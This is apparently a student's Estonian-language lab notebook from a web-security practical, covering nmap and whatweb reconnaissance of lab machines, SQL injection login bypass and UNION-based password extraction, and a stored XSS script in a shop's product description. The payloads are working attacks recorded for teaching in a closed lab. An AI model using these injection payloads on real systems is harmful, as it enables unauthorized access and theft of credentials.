# ⚙️ PRAKTILINE TUND: Veebirakenduse pahandused
**Autor:** ocrHeiki 
**Aeg:** 06.05.2026

## Veebilehe turvatestimine - Pentest tools

- **Detectify** - tarkvara millega testida, 2 nädalat tasuta
See annab väga täpse koha kätte, kus on viga

- **OpenCVE Library** - leht mida jälgida erinevatest turvaaukudest
---

## Sissejuhatus


## Masinad :computer:
---
- **kyberpank** Ubuntu
- **kyberpood** Ubuntu
- **Kali** 
- **Ruuter koos 2 network adapteriga**

---
### :computer: kyberpood: paneme lihtsalt tööle
### :computer: kyberpank: paneme lihtsalt tööle

## :computer: Kali:
### Alustame NMAP-iga (võrgu skännimine)
- Skänni võrku teenuste ja OS-idega:  
  `sudo nmap -sV -O 192.168.1.0/24` (lisa oma võrgu ID).  
  Näed tulemusi, sealhulgas port 22 (SSH), mis on häkkerite sihtmärk. Port knocking võib seda avada.

--- 
- Kontrolli protokolle terminalis:  
- `whatweb 192.168.1.61` (näitab veebilehe ehitust). 
- `whatweb 192.168.1.63` (näitab veebilehe ehitust). 
---
- Ava skännis leitud IP (nt 192.168.1.61) brauseris: Näen KüberPood sisselogimis lehte

Proovisin kasutaja: `admin` ja parool: `1' OR '1'='1` ning logis sisse. Logisin välja.

Proovisin ka SQL käsku ainult kasutaja väljal: `'UNION SELECT 1, password, 'admin' FROM users WHERE username='admin'#` ja logis sisse ning logis admin kasutaja rolliga sisse ning kuvab ka suurelt ekraanile **VagaSalajaneAdminParool_MidaKeegiEiTea! (Roll: admin)**.

Lisasime uue toote kus toote nimeks panime: `kohvi` ja 
Kirjelduse reale lisasime skripti, mille eesmärk oli muuta veebilehe taustavärvi:

```
<script>
  document.body.style.setProperty("background-color", "black", "important");
  document.body.style.setProperty("color", "#00FF00", "important");
  alert( "Süsteemis on kala sees" );
</script>
```
Inspect Line toote peal, saab selles poes tootenime ja kirjeldust muuta, kuid ei tohiks.



---  
- Ava skännis leitud IP (nt 192.168.1.63) brauseris: Näen Apache2 Default lehte




